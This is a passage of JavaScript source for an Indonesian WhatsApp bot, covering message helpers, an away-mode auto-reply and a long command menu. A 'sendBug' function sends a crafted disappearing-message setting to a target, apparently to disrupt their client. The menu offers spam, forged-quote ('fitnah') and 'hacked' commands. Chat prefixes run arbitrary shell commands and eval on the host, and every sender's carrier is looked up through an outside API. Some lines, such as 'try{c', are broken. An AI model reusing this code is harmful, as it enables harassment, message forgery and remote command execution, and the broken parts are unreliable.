                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'gifback': 'true', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
// TEXT WITH THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6287834993722-1621306547@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${tampilUcapan} ${pushname}`,
                 "title": `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6287834993722-1621306547@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "2",
                 "ptt": "true"
                        }
	                  } 
                     }
const sendBug = async (target) => {
      await nathan.relayWAMessage(
        nathan.prepareMessageFromContent(
          target,
          nathan.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
nathan.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await nathan.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
nathan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await nathan.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
nathan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await nathan.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
nathan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Halo ${pushname} Mohon Maaf Saat, Ini @${NomorOwner} Sedang Tidak Aktif Atau Bisa Dibilang Offline!\n\n*Dengan Alasan* ${alasanafk}\n*Sejak*\n${heheh.hours} Jam -  ${heheh.minutes} Menit - ${heheh.seconds} Detik Yang Lalu\n\nPesan Akan Dibalas Jika\n*@${NomorOwner}* Kembali _*AKTIF*_\nAuto Response By ${NamaBot} And Creator By @${NomorOwner}`, "*Candy BOT*", [{buttonId: 'simi', buttonText: {disText: 'Siap Kak'}, type: 1}], {quoted:ftroli, contextInfo: { forwardingScore: 999, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === nathan.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Halo ${pushname} Mohon Maaf Saat, Ini @${NomorOwner} Sedang Tidak Aktif Atau Bisa Dibilang Offline!\n\n*Dengan Alasan* ${alasanafk}\n*Sejak*\n${heheh.hours} Jam -  ${heheh.minutes} Menit - ${heheh.seconds} Detik Yang Lalu\n\nPesan Akan Dibalas Jika\n*@${NomorOwner}* Kembali _*AKTIF*_\nAuto Response By ${NamaBot} And Creator By @${NomorOwner}`, "*Candy BOT*", [{buttonId: 'simi', buttonText: {disText: 'Siap Kak'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 999, isForwarded: true}})
			}
		}
						}
					}
				}
			}
		}
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					nathan.sendMessage(to, media, sticker, {quoted: ftroli})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes Send Sticker'))
					});
					});
				});
			}
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        nathan.sendMessage(from, media, MessageType.sticker,{quoted:ftroli})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        nathan.sendMessage(from, { disname: nama, vcard: vcard}, MessageType.contact, {quoted:ftroli, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await nathan.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        nathan.sendMessage(from, { disname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			nathan.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://youtube.com/c/ZEROBOT7`}}})
		}
		const simir = (teks) => {
			nathan.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			nathan.sendMessage(hehe, teks, text, { quoted: ftok, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? nathan.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : nathan.sendMessage(from, teks.trim(), extendedText, { quoted: ftroli, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
nathan.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
nathan.sendMessage(from, hasil, type, options).catch(e => {
nathan.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					nathan.sendMessage(to, media, type, { quoted: ftroli, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await nathan.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				nathan.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
           if (budy.startsWith('>')){
if (!isOwner)return reply(`Perintah Ini Tidak Bisa Di Lakukan Oleh Jadibot Sementara`)
console.log(color('[ EVAL ]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{c
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('x')){
if (!mek.key.fromMe && !isOwner) return
try {
return nathan.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
var nani = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${nani} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}

			// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					nathan.sendMessage(from, result, sticker, { quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					nathan.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					nathan.sendMessage(from, result, image, { quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true}})
					}
			}
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot Telah Diunmute Di Group Ini')
            }
        }
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan Grup Bebas:v')
				nathan.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Maaf Kamu Akan Saya Kick')
			    nathan.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (bad.includes(messagesD)) {
				reply('_Jangan Toxic!_')
				}
				if (m.message && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
m.reply('Troli Detected\n\n' + require('util').format(m.key))
await nathan.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
}
if (!isGroup && !isCmd && !command && !mek.key.fromMe && !autorespon) {
numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
                     sami = simi.success
                        nathan.sendMessage(from, `_${sami}_`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:ftroli, contextInfo : {forwardingScore: 508, isForwarded: true}})
                      }
if (!settings.autoread) {
nathan.chatRead(from)
}
if (!settings.autocomposing) {
nathan.updatePresence(from, Presence.composing)
}
if (!settings.autorecording) {
nathan.updatePresence(from, Presence.recording)
}
   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]

        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
       
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd && !isGroup) {console.log(color('[ CMD ] ', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [ ${args.length} ]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('[ MESSAGE ]', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
		
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Reply Stickernya Kak')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
        switch (command) {
        case 'menu':
        case 'help':
        const timestampp = speed();
  const latensii = speed() - timestampp
  try {
    pic = await nathan.getProfilePicture(sender)
  } catch {
    pic = fs.readFileSync('./logoku.jpg')
  }
  gambar = await getBuffer(pic)
        ptod = "6287834993722@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await nathan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `${petik}Halo Dan ${ucapanWaktu} Kak ${pushname}\n\nPeringatan :\n1. ${petik}Button Tidak Dapat Terlihat Oleh Pengguna WhatsApp Mod. Dimohon Untuk Menggunakan WhatsApp Message Atau WhatsApp Business${petik}`
sendButImage(from, menu, `「 INFO BOT 」

❏ Mode = ${publik ? 'Public' : 'Self'}
❏ Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
❏ Nama Bot = ${NamaBot}
❏ Youtube = https://youtube.com/c/ZEROBOT7
❏ Creator Bot = Nathan`, gambar, [
{
      buttonId: `${prefix}snk`,
      buttonText: {
        displayText: `SYARAT & KETENTUAN`,
      },
      type: 1,
    }, {
      buttonId: `${prefix}allmenu`,
      buttonText: {
        displayText: `LIST MENU`,
      },
      type: 1,
    }, {
      buttonId: `${prefix}towner`,
      buttonText: {
        displayText: `JADI OWNER`,
      },
      type: 1,
    },
  ], {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), contextInfo: { forwardingScore: 99999, isForwarded: true }});
break
case 'allmenu':
        ptod = "6287834993722@s.whatsapp.net"
        try {
    pic = await nathan.getProfilePicture(sender)
  } catch {
    pic = fs.readFileSync('./logoku.jpg')
  }
  gambar = await getBuffer(pic)
        stod = `${sender}`
        uwu = '```'
       stst = await nathan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
menu = `
╭──────「 INFO BOT 」──────❋ཻུ۪۪⸙
│
│❏ Creator : @${dtod.split('@')[0]}
│❏ Battery : ${baterai.battery}
│❏ Mode : ${publik ? 'Public' : 'Self'}
│❏ Total Hit : ${cmhit.length}
│❏ Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
│❏ Nomor Owner : @${otod.split('@')[0]}
│
└────────────────────⳹

╭─────「 INFO USER 」─────❋ཻུ۪۪⸙
│
│❏ Status : ${isOwner ? 'Owner' : 'User'}
│❏ Nama : ${pushname}
│❏ Bio : ${stst}
│❏ Role : ${role}
│❏ Level : 
│❏ Nomor : @${stod.split('@')[0]}
│❏ Info Nomor : ${num.data.countrycode} - ${num.data.carrier.type} - ${num.data.carrier.name}
│
└────────────────────⳹

╭──────「 TIME 」──────❋ཻུ۪۪⸙
│     ${tampilUcapan}
│❏ JAM : ${jmn}
│❏ HARI : ${week} ${weton}
│❏ TANGGAL : ${calender}
│❏ WIB : ${timeWib} WIB
│❏ WITA : ${timeWita} WITA
│❏ WIT : ${timeWit} WIT
│
└──────────────────⳹


╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│OWNER MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}autorespon [ on/off ]
│❏ ${prefix}bc [ teks/reply gif/image/video with caption ]
│❏ ${prefix}tobc [ reply sticker/audio with caption ]
│❏ ${prefix}return [ javascript ]
│❏ ${prefix}clearall
│❏ ${prefix}delchat
│❏ ${prefix}mute
│❏ ${prefix}unmute
│❏ ${prefix}public
│❏ ${prefix}self
│❏ ${prefix}spam [ teks|jumlah ]
│❏ ${prefix}demoteall
│❏ ${prefix}promoteall
│❏ ${prefix}addcmd [ teks reply stiker ]
│❏ ${prefix}delcmd [ reply stiker ]
│❏ ${prefix}listcmd
│❏ ${prefix}spamsw [ teks|jumlah ]
│❏ ${prefix}upswteks [ teks ]
│❏ ${prefix}upswlokasi [ teks ]
│❏ ${prefix}upswaudio [ reply audio ]
│❏ ${prefix}upswvoice [ reply audio ]
│❏ ${prefix}upswsticker [ reply sticker ]
│❏ ${prefix}upswimage [ reply image with caption ]
│❏ ${prefix}upswgif [ reply gif with caption ]
│❏ ${prefix}upswvideo [ reply video with caption ]
│❏ ${prefix}shutdown
│❏ ${prefix}offline [ alasan ]
│❏ ${prefix}online
│❏ ${prefix}exif [ nama|author ]
│❏ ${prefix}setprofile [ reply image ]
│❏ ${prefix}setname [ teks ]
│❏ ${prefix}setprefix [ multi/nopref ]
│❏ ${prefix}setbio [ teks ]
│❏ ${prefix}leave
│❏ ${prefix}restart
│❏ ${prefix}join [ link group ]
│❏ ${prefix}addrespon [ tanya|jawab ]
│❏ ${prefix}delrespon [ nama ]
│❏ ${prefix}q [ reply message ]
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│GAME MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}ttt [tag 1 pemain]
│❏ ${prefix}bertumbuk [tag 1 pemain]
│❏ ${prefix}truth
│❏ ${prefix}dare
│❏ ${prefix}kapankah
│❏ ${prefix}bisakah
│❏ ${prefix}cekganteng
│❏ ${prefix}cekcantik
│❏ ${prefix}cekmati
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│DOWNLOAD MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}infogempa
│❏ ${prefix}herolist
│❏ ${prefix}herodetail [ hero ]
│❏ ${prefix}google [ search ]
│❏ ${prefix}gimage [ search ]
│❏ ${prefix}wiki [ search ]
│❏ ${prefix}mediafire [ link ]
│❏ ${prefix}ytsearch [ judul ]
│❏ ${prefix}ytmp4 [ link yt ]  PERBAIKAN
│❏ ${prefix}ytmp3 [ link yt ]
│❏ ${prefix} [ judul lagu ]
│❏ ${prefix}video [ judul video ]
│❏ ${prefix}tinyurl [ link ]
│❏ ${prefix}fetch [ link ]
│❏ ${prefix}igdl [ link ]
│❏ ${prefix}tiktokdl [ link ]
│❏ ${prefix}pinterest [ search ]
│❏ ${prefix}lirik [ judul ]
│❏ ${prefix}tourl [ reply image/video ]
│❏ ${prefix}resepmasakan [ judul ]
│❏ ${prefix}artimimpi [ teks ]
│❏ ${prefix}bilangangka [ angka ]
│❏ ${prefix}kalkulator [ angka ]
│❏ ${prefix}fancytext [ teks ]
│❏ ${prefix}githubstalk [ username ]
│❏ ${prefix}translate [ kodebhs|teks ]
│❏ ${prefix}ss [ link ]
│❏ ${prefix}tiktokaudio [ link ]
│❏ ${prefix}igstory [ link ]
│❏ ${prefix}linkwa
│❏ ${prefix}store [ query ]
│❏ ${prefix}fb [ link ]
│❏ ${prefix}twitter [ link ]
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│IMAGE MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}randomwp
│❏ ${prefix}foliokiri 「 text 」
│❏ ${prefix}foliokanan 「 text 」
│❏ ${prefix}nuliskanan 「 text 」
│❏ ${prefix}nuliskiri 「 text 」
│❏ ${prefix}matrix [ teks ]
│❏ ${prefix}googletxt [ teks ]
│❏ ${prefix}spiderman [ teks ]
│❏ ${prefix}express [ teks ]
│❏ ${prefix}dance [ teks ]
│❏ ${prefix}blackbird [ teks ]
│❏ ${prefix}memegen 「 text1|teks2 」
│❏ ${prefix}halloween [ teks ]
│❏ ${prefix}vampire [ teks ]
│❏ ${prefix}codetxt [ teks ]
│❏ ${prefix}text3d [ teks ]
│❏ ${prefix}warrior [ teks ]
│❏ ${prefix}maker2d2 [ text ] 
│❏ ${prefix}maker2d3 [ text ] 
│❏ ${prefix}maker2d4 「 text 」
│❏ ${prefix}maker3d 「 text 」
│❏ ${prefix}maker3d2 「 text 」
│❏ ${prefix}maker3d3 「 text 」
│❏ ${prefix}maker3d4 「 text 」
│❏ ${prefix}transformer 「 text 」
│❏ ${prefix}googletxt 「 text 」
│❏ ${prefix}battlefield 「 text 」
│❏ ${prefix}coffeecup 「 text 」
│❏ ${prefix}coffeecup2 「 text 」
│❏ ${prefix}neon 「 text 」
│❏ ${prefix}glow 「 text 」
│❏ ${prefix}summer 「 text 」
│❏ ${prefix}flower 「 text 」
│❏ ${prefix}burn 「 text 」
│❏ ${prefix}quote 「 text 」
│❏ ${prefix}wooden 「 text 」
│❏ ${prefix}golden 「 text 」
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│GROUP MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}getpict [ @tag ]
│❏ ${prefix}getname [ reply target ]
│❏ ${prefix}getbio [ reply target ]
│❏ ${prefix}promote [ @tag ]
│❏ ${prefix}demote [ @tag ]
│❏ ${prefix}antilink [ 1/0 ]
│❏ ${prefix}nsfw [ 1/0 ]
│❏ ${prefix}creategrup [ nama|@tag ]
│❏ ${prefix}tictactoe [ @tag ]
│❏ ${prefix}delttt
│❏ ${prefix}getpp
│❏ ${prefix}kick [ @tag ]
│❏ ${prefix}add [ nomor ]
│❏ ${prefix}getdeskgc
│❏ ${prefix}sider [ reply pesan bot ]
│❏ ${prefix}hacked [ teks ]
│❏ ${prefix}setnamegc [ teks ]
│❏ ${prefix}setdeskgc [ teks ]
│❏ ${prefix}fitnah [ @tag|teks1|teks2 ]
│❏ ${prefix}kontak [ @tag|nama ]
│❏ ${prefix}kontag [ @tag|nama ]
│❏ ${prefix}opengc
│❏ ${prefix}closegc
│❏ ${prefix}resetlinkgc
│❏ ${prefix}linkgrup
│❏ ${prefix}listonline
│❏ ${prefix}listadmin
│❏ ${prefix}nathanline
│❏ ${prefix}hidetag [ teks ]
│❏ ${prefix}sticktag [ nama sticker ]
│❏ ${prefix}stag [ reply media ]
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│NSFW MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}trapnime
│❏ ${prefix}neko
│❏ ${prefix}megumin
│❏ ${prefix}blowjob
│❏ ${prefix}hentai
│❏ ${prefix}awoo
│❏ ${prefix}bj 
│❏ ${prefix}eroneko
│❏ ${prefix}lesbian
│❏ ${prefix}anal
│❏ ${prefix}yuri
│❏ ${prefix}baka
│❏ ${prefix}neko2
│❏ ${prefix}wallpaper
│❏ ${prefix}pussy
│❏ ${prefix}kitsune
│❏ ${prefix}keta
│❏ ${prefix}neko2
│❏ ${prefix}poke
│❏ ${prefix}slap
│❏ ${prefix}komiku [ query ]
│❏ ${prefix}otaku [ query ]
│❏ ${prefix}chara [ query ]
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│JADIBOT MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}jadibot
│❏ ${prefix}listjadibot
│❏ ${prefix}stopjadibot
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│TOOLS MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}getscmd
│❏ ${prefix}stickerwm [ nama|author ]
│❏ ${prefix}takestick [ nama|author ]
│❏ ${prefix}colong [ reply sticker ]
│❏ ${prefix}sticker
│❏ ${prefix}get [ url ]
│❏ ${prefix}fetch [ url ]
│❏ ${prefix}semoji [ emoji ]
│❏ ${prefix}notif
│❏ ${prefix}waktu
│❏ ${prefix}citacita
│❏ ${prefix}ultah [ tahun-bulan-tanggal ]
│❏ ${prefix}attp [ teks ]
│❏ ${prefix}toimg
│❏ ${prefix}kalkulator [ 12/2 ] 
│❏ ${prefix}ocr [ reply image ]
│❏ ${prefix}tomp3 [ reply video ]
│❏ ${prefix}tomp4 [ reply sticker gif ]
│❏ ${prefix}robot [ reply audio ]
│❏ ${prefix}balik [ reply audio ]
│❏ ${prefix}bass [ reply audio ]
│❏ ${prefix}gemuk [ reply audio ]
│❏ ${prefix}detikvn [ reply audio caption angka ]
│❏ ${prefix}detikvideo [ reply video caption angka ]
│❏ ${prefix}tts [ kodebhs teks ]
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│DATABASE MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}addsticker [ nama ]
│❏ ${prefix}delsticker [ nama ]
│❏ ${prefix}addvn [ nama ]
│❏ ${prefix}delvn [ nama ]
│❏ ${prefix}addimage [ nama ]
│❏ ${prefix}delimage [ nama ]
│❏ ${prefix}listimage
│❏ ${prefix}liststicker
│❏ ${prefix}listvn
│
└────────────────────⳹

╭──────────────────❋ཻུ۪۪⸙
│
├──────────────────
│OTHER MENU
├──────────────────
│
├──────────────────⳹
│
│❏ ${prefix}caripesan [ teks|jumlah ]
│❏ ${prefix}slots
│❏ ${prefix}suit [ gunting/batu/kertas ]
│❏ ${prefix}tag [ nomor ]
│❏ ${prefix}tagme
│❏ ${prefix}readmore [ teks1|teks2 ]
│❏ ${prefix}fitnahpc [ nomor|teks1|teks2 ]
│❏ ${prefix}chat [ nomor|teks ]
